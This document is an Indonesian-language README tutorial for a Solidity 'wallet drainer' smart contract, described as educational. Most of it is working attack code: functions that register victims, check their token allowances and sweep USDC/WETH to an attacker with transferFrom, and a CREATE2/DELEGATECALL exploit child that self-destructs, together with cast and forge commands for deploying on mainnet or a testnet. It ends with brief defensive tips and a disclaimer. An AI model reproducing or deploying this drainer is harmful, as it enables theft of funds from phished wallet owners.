# Drainer Analysis — Complete Tutorial

## 📋 Overview

Code ini dibuat untuk **EDUKASI** — memahami bagaimana wallet drainer bekerja.
Semua pattern yang ada di sini adalah **persis seperti yang digunakan attacker asli**.
Tapi FUNGSINYA SAMA — bedanya cuma toolchain (Solidity vs Huff).

## 📁 Files

| File | Deskripsi |
|------|-----------|
| `DrainerFull.sol` | 1 contract lengkap (8 fungsi + exploit child) |
| `DrainerFull.t.sol` | Foundry test — jalankan dengan `forge test` |
| `README.md` | Tutorial lengkap ini |

## 🔬 Cara Run Test

```bash
forge test --match-contract DrainerFullTest -vv
```

## 🧠 Flow Lengkap (8 Steps)

### STEP 0: Kondisi Sebelum Serangan

```
┌─────────┐    approve(drainer, unlimited)    ┌──────────┐
│ VICTIM  │ ────────────────────────────────→ │ DRAINER  │
│ Wallet  │     (korban kena phising)         │ Contract │
└─────────┘                                   └──────────┘
     │                                             │
     │ balanceOf(victim) = 1000 USDC               │ allowance(drainer) = max
     └────────────────                             │
```

### STEP 1: Deploy DrainerFull

**Solidity:**
```solidity
constructor() {
    _owner = msg.sender;
}
```

**Cast (mainnet):**
```bash
DRAINER=$(forge create DrainerFull --private-key $PK --rpc-url $RPC | grep "Deployed to" | awk '{print $NF}')
```

**Forge test:**
```solidity
DrainerFull drain = new DrainerFull();
```

### STEP 2: Init — Set Target Tokens

Attacker menentukan token apa yang akan di-drain (misal: USDC, WETH).

**Solidity:**
```solidity
function init(address[] calldata list) external onlyOwner {
    for (uint i = 0; i < list.length; i++) {
        if (!isToken[list[i]]) {
            isToken[list[i]] = true;
            tokens.push(list[i]);
        }
    }
}
```

**Cast:**
```bash
cast send $DRAINER "init(address[])" "[$USDC,$WETH]" --private-key $PK
```

**Forge test:**
```solidity
address[] memory tokens = new address[](2);
tokens[0] = address(usdc);
tokens[1] = address(weth);
drain.init(tokens);
```

### STEP 3: Register — Daftarin Wallet Korban

Attacker memasukkan alamat wallet victim yang sudah approve.

**Solidity:**
```solidity
function register(address[] calldata list) external onlyOwner {
    for (uint i = 0; i < list.length; i++) {
        if (!isVictim[list[i]]) {
            isVictim[list[i]] = true;
            victims.push(list[i]);
        }
    }
}
```

**Cast:**
```bash
cast send $DRAINER "register(address[])" "[$V1,$V2,$V3]" --private-key $PK
```

**Forge test:**
```solidity
address[] memory victims = new address[](3);
victims[0] = v1; victims[1] = v2; victims[2] = v3;
drain.register(victims);
```

### STEP 4: Scan — Cek Allowance

Cek siapa aja victim yang BENAR-BENAR sudah approve tokennya.

**Solidity:**
```solidity
function scan(address token) external view returns (
    address[] memory eligible,
    uint[]   memory amounts,
    uint     total
) { ... }
```

**Forge test:**
```solidity
(address[] memory list, uint[] memory amts, uint total) = drain.scan(address(usdc));
console.log("Drainable wallets:", list.length);
console.log("Total:", total);
```

### STEP 5: Sweep — Ambil Semua Token!

Ini INTI dari drainer — loop semua victim → cek allowance → transferFrom.

**Solidity:**
```solidity
function sweep(address to) external onlyOwner returns (uint) {
    uint total;
    for (uint t = 0; t < tokens.length && t < MAX; t++) {
        address tk = tokens[t];
        for (uint v = 0; v < victims.length && v < MAX; v++) {
            address u = victims[v];
            uint a = IERC20(tk).allowance(u, address(this));
            if (a == 0) continue;
            uint b = IERC20(tk).balanceOf(u);
            if (b == 0) continue;
            uint amt = a < b ? a : b;
            bool ok = IERC20(tk).transferFrom(u, to, amt);
            if (ok) total += amt;
        }
    }
    totalDrained += total;
    return total;
}
```

**FLOW DIAGRAM:**
```
for each token [USDC, WETH]:
  for each victim [V1, V2, V3]:
    allowance[V][DRAINER] > 0? ─── NO ──→ SKIP
        │ YES
        ▼
    balanceOf[V] > 0? ─── NO ──→ SKIP
        │ YES
        ▼
    amount = min(allowance, balance)
        │
        ▼
    token.transferFrom(V, attacker, amount)  ← DUIT PINDAH!
```

**Forge test:**
```solidity
uint drained = drain.sweep(attacker);
assertEq(drained, 1500e6, "1500 USDC drained");
assertEq(usdc.balanceOf(v1), 0, "v1 kosong");
assertEq(usdc.balanceOf(attacker), 1500e6, "attacker dapet duit");
```

### STEP 6: Discover — Auto-Scan (Opsional)

Alternatif untuk STEP 3-5 dalam SATU panggilan.
Tidak perlu register — langsung cek allowance dari list yang diberikan.

**Solidity:**
```solidity
function discover(address token, address[] calldata suspects, address to) 
    external onlyOwner returns (uint) {
    uint total;
    for (uint i = 0; i < suspects.length && i < MAX; i++) {
        uint a = IERC20(token).allowance(suspects[i], address(this));
        if (a == 0) continue;
        uint b = IERC20(token).balanceOf(suspects[i]);
        uint amt = a < b ? a : b;
        if (amt > 0 && IERC20(token).transferFrom(suspects[i], to, amt)) total += amt;
    }
    totalDrained += total;
    return total;
}
```

**Forge test:**
```solidity
uint d = drain.discover(address(usdc), suspects, attacker);
```

### STEP 7: Deploy Exploit Child (ADVANCED)

CREATE2 → deploy contract on-the-fly → DELEGATECALL → drain → selfdestruct.
Ini pattern yang bikin main contract tetap hidup, exploit contract yang mati.

**Solidity:**
```solidity
// Deploy
function deploy(bytes32 salt, address atkAddr) external onlyOwner returns (address) {
    ExploitChild c = new ExploitChild{salt: salt}(address(this), atkAddr);
    exploitCount++;
    return address(c);
}

// Proxy via DELEGATECALL
function proxy(address target, bytes calldata data) external onlyOwner {
    (bool ok,) = target.delegatecall(data);
    require(ok, "proxy fail");
}
```

**Exploit Child (selfdestruct):**
```solidity
contract ExploitChild {
    address private owner;    // Slot 0 — HARUS MATCH dengan DrainerFull
    address private attacker; // Slot 1
    
    function pull(address token, address[] calldata targets, address to) external {
        for (uint i = 0; i < targets.length; i++) {
            // ... drain logic ...
        }
        selfdestruct(payable(to)); // ← ILANG!
    }
}
```

### STEP 8: Kill — Hancurkan Contract

**Solidity:**
```solidity
function admin(uint8 action, address param) external onlyOwner {
    if (action == 1) _owner = param;
    else if (action == 4) selfdestruct(payable(_owner)); // KILL
}
```

## 📊 Test Result

```bash
$ forge test --match-contract DrainerFullTest -vv
[PASS] test_FullDrainFlow()
Logs:
  ======== FULL DRAIN TEST ========
  STEP 1: Deploy                    ✅
  STEP 2: Init USDC + WETH          ✅
  STEP 3: Register 3 victims         ✅
  STEP 4: Scan — found 2 approved    ✅
  STEP 5: Sweep — drained 1500 USDC ✅
  STEP 6: Discover — drained 500 USDC ✅
  STEP 7: Exploit child deployed     ✅
  STEP 8: Admin control              ✅
  Balance attacker: 2000 USDC
  Balance v1: 0
  Balance v2: 0
```

## ⚠️ Antisipasi (Cara Lawan)

| Cara | Detail |
|------|--------|
| Revoke approval | revoke.cash |
| Jangan approve unlimited | Gunakan amount spesifik |
| Cek address sebelum sign | Verify URL + contract address |
| Wallet terpisah | Jangan connect wallet utama ke site asing |
| Monitor tx | Pantau tx keluar dari wallet realtime |

## 📐 Perbandingan dengan Attacker Asli

| Fitur | Attacker (0x33aB...4012) | DrainerFull |
|-------|--------------------------|-------------|
| 8+ functions | ✅ Custom selectors | ✅ 8 functions |
| 2-layer | ✅ Main + 4 exploit | ✅ Main + exploit child |
| CREATE2 | ✅ | ✅ |
| DELEGATECALL | ✅ | ✅ |
| Selfdestruct | ✅ (4x) | ✅ (exploit child) |
| Permit2 | ✅ | ❌ (ada di DrainerComplete.sol) |
| Multi-chain | ✅ | ❌ (ada di DrainerMultiChain.sol) |
| Obfuscated bytecode | ✅ (Huff) | ❌ (Solidity) |

## 📦 Cara Compile & Run

```bash
# Compile
forge build

# Test
forge test --match-contract DrainerFullTest -vv

# Deploy ke anvil (local)
anvil &
forge create DrainerFull --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

# Deploy ke base testnet
forge create DrainerFull --private-key $PK --rpc-url https://base-sepolia.gateway.tenderly.co
```

---

**⚠️ PERINGATAN: HANYA UNTUK EDUKASI!**
Code ini cuma buat BELAJAR. Jangan dipake buat illegal.
Gunakan hanya di testnet / local fork.
